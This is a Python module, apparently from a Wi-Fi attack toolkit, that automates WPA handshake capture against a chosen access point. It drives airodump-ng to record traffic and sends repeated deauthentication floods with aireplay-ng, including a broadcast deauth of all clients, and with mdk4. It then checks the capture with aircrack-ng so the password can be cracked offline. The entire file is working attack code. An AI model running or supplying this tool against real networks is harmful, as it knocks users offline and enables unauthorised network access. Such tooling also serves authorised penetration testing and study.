# File: engines/handshake_capture.py
import subprocess
import time
import os
import re
from pathlib import Path
from core.error_handler import ErrorHandler

class HandshakeCapture:
    def __init__(self, config, error_handler):
        self.config = config
        self.error_handler = error_handler
        self.capture_file = '/tmp/pegasus_handshake'
        
    def find_existing_handshake(self, target_bssid, search_dirs=['/tmp', './hs', '.', '/root', 'hs']):
        """
        Look for existing handshake files for this target
        """
        print("   🔍 Searching for existing handshake files...")
        
        handshake_patterns = [
            f'*{target_bssid.replace(":", "-")}*.cap',
            f'*handshake*{target_bssid.replace(":", "")}*.cap',
            f'*{target_bssid.replace(":", "")}*.cap',
            f'*{target_bssid.replace(":", "_")}*.cap',
            '*.cap'  # Any capture file
        ]
        
        for search_dir in search_dirs:
            if not os.path.exists(search_dir):
                continue
                
            for pattern in handshake_patterns:
                for file_path in Path(search_dir).glob(pattern):
                    if os.path.getsize(file_path) > 1000:  # Reasonable file size
                        print(f"   ✅ Found existing handshake: {file_path}")
                        if self._verify_handshake(str(file_path)):
                            return str(file_path)
        
        print("   ❌ No existing handshake files found")
        return None

    def capture_handshake(self, target_bssid, target_channel, interface='wlan0mon', timeout=180):
        """
        Capture WPA handshake by deauthenticating clients and monitoring
        """
        print(f"🎯 Attempting to capture handshake for {target_bssid}...")
        print(f"   📡 Channel: {target_channel}, Interface: {interface}")
        print(f"   ⏱️  Timeout: {timeout} seconds")
        
        # Ensure we're using monitor mode interface
        if not interface.endswith('mon'):
            print(f"   ⚠️  Warning: Using {interface} instead of monitor mode interface")
        
        try:
            # Clean up any previous capture files
            self.cleanup_capture_files()
            
            # Start airodump-ng to monitor for handshakes
            airodump_cmd = [
                'sudo', 'airodump-ng',
                '--bssid', target_bssid,
                '--channel', str(target_channel),
                '--write', self.capture_file,
                '--output-format', 'cap',
                interface
            ]
            
            print(f"   📊 Starting capture: {' '.join(airodump_cmd)}")
            airodump_process = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Wait for airodump to start
            time.sleep(5)
            
            # Send deauthentication packets to trigger handshake
            deauth_success = self._send_deauth_packets(target_bssid, interface)
            
            if not deauth_success:
                print("   ⚠️  Deauthentication failed, but continuing capture...")
                print("   💡 Handshake may still be captured from existing client activity")
            
            # Monitor for handshake with better progress tracking
            handshake_captured = self._monitor_for_handshake_with_progress(timeout)
            
            # Stop airodump
            airodump_process.terminate()
            try:
                airodump_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                airodump_process.kill()
                airodump_process.wait()
            
            if handshake_captured:
                print("   ✅ WPA Handshake captured successfully!")
                handshake_file = f"{self.capture_file}-01.cap"
                # Verify the handshake is valid
                if self._verify_handshake(handshake_file):
                    return handshake_file
                else:
                    print("   ❌ Captured file doesn't contain valid handshake")
                    return None
            else:
                print("   ❌ Failed to capture handshake within timeout")
                print("   💡 Tips:")
                print("      • Ensure target has active clients")
                print("      • Try different deauth methods") 
                print("      • Increase timeout duration")
                print("      • Move closer to target for better signal")
                return None
                
        except Exception as e:
            self.error_handler.handle_error('E202', f"Handshake capture failed for {target_bssid}", e)
            return None
    
    def _send_deauth_packets(self, target_bssid, interface, count=20):
        """
        Send deauthentication packets to trigger handshake
        """
        try:
            print("   📡 Sending deauthentication packets...")
            
            # Ensure we're using monitor mode interface
            if not interface.endswith('mon'):
                print(f"   ⚠️  WARNING: Using {interface} for deauth - should be monitor mode!")
            
            # Try multiple deauth methods
            deauth_commands = [
                # Method 1: Standard deauth
                ['sudo', 'aireplay-ng', '--deauth', str(count), '-a', target_bssid, interface],
                # Method 2: Deauth with ignore negative one
                ['sudo', 'aireplay-ng', '--deauth', str(count), '-a', target_bssid, '--ignore-negative-one', interface],
                # Method 3: Broadcast deauth (affects all clients)
                ['sudo', 'aireplay-ng', '--deauth', '5', '-a', target_bssid, '-c', 'FF:FF:FF:FF:FF:FF', interface],
            ]
            
            # Add mdk4 if available
            try:
                result = subprocess.run(['which', 'mdk4'], capture_output=True, text=True)
                if result.returncode == 0:
                    deauth_commands.append(['sudo', 'mdk4', interface, 'd', '-b', f'{target_bssid}'])
                    print("   🔧 MDK4 available - will try as fallback")
            except:
                pass
            
            success_count = 0
            for deauth_cmd in deauth_commands:
                try:
                    print(f"   🔧 Trying: {' '.join(deauth_cmd)}")
                    process = subprocess.run(
                        deauth_cmd,
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    
                    if process.returncode == 0:
                        print("   ✅ Deauthentication packets sent successfully")
                        success_count += 1
                        # Don't break - try multiple methods for better coverage
                    else:
                        if process.stderr:
                            error_msg = process.stderr.strip()
                            if "Network is down" in error_msg:
                                print(f"   ❌ Interface issue: {error_msg}")
                            else:
                                print(f"   ❌ Deauth failed: {error_msg}")
                        else:
                            print(f"   ❌ Deauth failed (no error output)")
                        
                except subprocess.TimeoutExpired:
                    print("   ⏱️  Deauth command timeout (may still have worked)")
                    success_count += 1
                except Exception as e:
                    print(f"   ⚠️  Deauth method failed: {e}")
                    continue
            
            return success_count > 0
                
        except Exception as e:
            self.error_handler.handle_error('E202', f"Deauthentication failed for {target_bssid}", e)
            return False
    
    def _monitor_for_handshake_with_progress(self, timeout):
        """Monitor for handshake with detailed progress"""
        print("   🔍 Monitoring for handshake...")
        
        start_time = time.time()
        cap_file = f"{self.capture_file}-01.cap"
        last_size = 0
        file_growing = False
        
        while time.time() - start_time < timeout:
            # Check if handshake file exists and has data
            if os.path.exists(cap_file):
                current_size = os.path.getsize(cap_file)
                
                # Show file growth
                if current_size > last_size:
                    file_growing = True
                    print(f"   📈 Capture file growing: {current_size} bytes", end='\r')
                    last_size = current_size
                elif current_size == last_size and file_growing:
                    print(f"   📊 Capture file stable: {current_size} bytes", end='\r')
                
                # Verify it contains a handshake
                if current_size > 5000 and self._verify_handshake(cap_file):
                    print("")  # New line after progress
                    print("   ✅ Valid handshake detected in capture file!")
                    return True
            
            # Progress update every 10 seconds
            elapsed = int(time.time() - start_time)
            if elapsed % 10 == 0:
                remaining = timeout - elapsed
                status = "📈 Growing" if file_growing else "⏳ Waiting"
                print(f"   {status} - {elapsed}/{timeout}s ({remaining}s remaining)")
            
            time.sleep(2)
        
        print("")  # New line after progress
        return False
    
    def _verify_handshake(self, cap_file):
        """
        Verify that the capture file contains a valid handshake
        """
        try:
            if not os.path.exists(cap_file):
                return False
                
            file_size = os.path.getsize(cap_file)
            if file_size < 1000:
                return False
            
            verify_cmd = [
                'aircrack-ng',
                cap_file
            ]
            
            process = subprocess.run(
                verify_cmd,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            # Look for handshake indication in output
            if 'WPA (1 handshake)' in process.stdout:
                return True
            elif 'WPA (0 handshake)' in process.stdout:
                print("   ❌ Capture file exists but contains 0 handshakes")
                return False
            else:
                # If we can't determine, check file characteristics
                if file_size > 10000:  # Reasonable size for capture
                    print("   ⚠️  Cannot verify handshake, but file looks promising")
                    return True
                return False
                
        except Exception as e:
            print(f"   ⚠️  Handshake verification failed: {e}")
            # If verification fails, use file size as fallback
            return os.path.getsize(cap_file) > 10000
    
    def cleanup_capture_files(self):
        """Clean up handshake capture files"""
        try:
            patterns = [
                f"{self.capture_file}-01.cap",
                f"{self.capture_file}-01.csv", 
                f"{self.capture_file}-01.netxml",
                f"{self.capture_file}-01.kismet.csv",
                f"{self.capture_file}-01.kismet.netxml"
            ]
            
            for pattern in patterns:
                if os.path.exists(pattern):
                    os.remove(pattern)
                    print(f"   🧹 Cleaned up: {pattern}")
        except Exception as e:
            print(f"   ⚠️  Cleanup warning: {e}")